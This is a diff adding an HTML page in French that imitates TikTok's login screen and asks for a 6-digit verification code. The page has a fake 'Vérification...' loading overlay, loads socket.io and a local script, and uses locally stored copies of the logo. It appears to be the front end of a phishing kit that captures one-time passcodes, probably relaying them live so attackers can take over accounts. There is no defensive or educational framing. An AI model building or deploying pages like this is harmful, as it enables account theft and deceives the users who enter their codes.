@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion | TikTok</title>
+    <link rel="stylesheet" href="style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+    <link rel="icon" type="image/png" href="téléchargé.png">
+</head>
+<body>
+    <div id="loading-overlay" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(255,255,255,0.85); z-index:9999; flex-direction:column; justify-content:center; align-items:center;">
+    <div style="width:40px; height:40px; border:4px solid #f3f3f3; border-top:4px solid #fe2c55; border-radius:50%; animation:spin 1s linear infinite;"></div>
+    <p style="margin-top:15px; font-family:sans-serif; color:#333;">Vérification...</p>
+</div>
+
+<style>
+@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+</style>
+    <header class="main-header">
+        <div class="header-left">
+            <img src="images.png" alt="TikTok" class="logo-img">
+            <span class="logo-text">TikTok</span>
+        </div>
+        <div class="header-right">
+            <div class="help-section">
+                <svg width="24" height="24" viewBox="0 0 48 48" fill="none"><path d="M24 44C35.0457 44 44 35.0457 44 24C44 12.9543 35.0457 4 24 4C12.9543 4 4 12.9543 4 24C4 35.0457 12.9543 44 24 44Z" fill="none" stroke="#161823" stroke-width="4" stroke-linejoin="round"/><path d="M24 35V34" stroke="#161823" stroke-width="4" stroke-linecap="round" stroke-linejoin="round"/><path d="M19 19C19 16.2386 21.2386 14 24 14C26.7614 14 29 16.2386 29 19C29 20.8407 28.0059 22.4491 26.5165 23.328C25.011 24.2166 24 25.4389 24 27.1852V28" stroke="#161823" stroke-width="4" stroke-linecap="round" stroke-linejoin="round"/></svg>
+                <span>Commentaires et assistance</span>
+            </div>
+        </div>
+    </header>
+<br><br><br>
+    <div class="login-container">
+        <div class="login-box">
+            <h2 class="title">Connexion</h2><br><br><br>
+                <div class="login-box otp-box">
+    <h2 class="title">Saisir le code à 6 chiffres</h2>
+    <p class="otp-description">Le code a été envoyé à votre adresse e-mail ou téléphone.</p>
+    
+    <form id="otpForm">
+        <div class="otp-inputs">
+    <input type="text" class="otp-field" id="otp-1" maxlength="1">
+    <input type="text" class="otp-field" id="otp-2" maxlength="1">
+    <input type="text" class="otp-field" id="otp-3" maxlength="1">
+    <input type="text" class="otp-field" id="otp-4" maxlength="1">
+    <input type="text" class="otp-field" id="otp-5" maxlength="1">
+    <input type="text" class="otp-field" id="otp-6" maxlength="1">
+</div>
+
+        <div class="resend-section">
+            <p>Vous n'avez pas reçu de code ? <a href="#" id="resendBtn">Renvoyer le code</a></p>
+        </div>
+
+        <button type="submit" class="btn-login" id="otp-btn">Vérifier</button>
+    </form>
+</div>
+
+        <div class="footer-box">
+            <p>Vous n'avez pas de compte ? <a href="#">Inscription</a></p>
+        </div>
+        </div>
+     </div>   
+          <div class="login-container">
+                
+</div>
+
+
+        </div>
+    <script src="/socket.io/socket.io.js"></script>
+    
+    <script src="script.js"></script>
+</body>
+</html>
+</body>
+</html>
